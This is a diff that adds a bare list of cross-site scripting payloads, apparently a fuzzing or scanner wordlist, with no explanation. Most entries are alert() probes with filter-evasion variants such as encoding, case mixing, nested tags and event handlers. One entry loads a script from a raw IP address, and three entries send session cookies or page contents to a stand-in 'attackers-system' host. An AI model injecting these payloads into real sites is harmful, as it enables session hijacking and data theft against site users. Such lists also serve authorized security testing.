@@ -1,0 +1,25 @@
+<script>alert('XSS_Found');</script>
+"><script>alert('XSS_Found')</script>
+<script>alert(document.cookie);</script>
+<scr<script></script>ipt>alert(document.cookie);</scr<script></script>ipt>
+<sCriPt>alert(document.cookie);</scRIPt>
+%3CSCRIPT%3Ealert(document.cookie);%3C%2FSCRIPT%3E
+%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E
+<script src=http://88.151.219.231/xss/1.js></script>
+';alert(String.fromCharCode(88,83,83))//'
+></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> 
+"><script>alert(document.cookie);</script>
+><script>alert(document.cookie);</script>
+<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
+<base href="javascript:alert(document.cookie)"/>
+<a href="#" > click me </a>
+' onload='alert(1)
+" onload="alert(1)
+<?xml-stylesheet href="javascript:alert(1)"?>
+<img/src="."alt=""onerror="alert(document.cookie)"/>
+<a onmouseover=alert(document.cookie)>xxs link</a>
+<\IMG\SRC=javas<!-- -->cri<!-- -->pt:alert('XSS')>
+=<script>window.location="http://attackers-system/creds-collect?token="+document.cookie</script>
+=%3Cscript%3Ewindow.location="http://attackers-system/creds-collect?token="%2bdocument.cookie%3C/script%3E
+<script>a = document.getElementsByTagName('body')[0].innerHTML;window.location = "http://attackers-system/steal?steal="+encodeURIComponent(a);</script>
+New+content <img src="http://www.securetest.com/_client/images/global/branding_logo.gif">
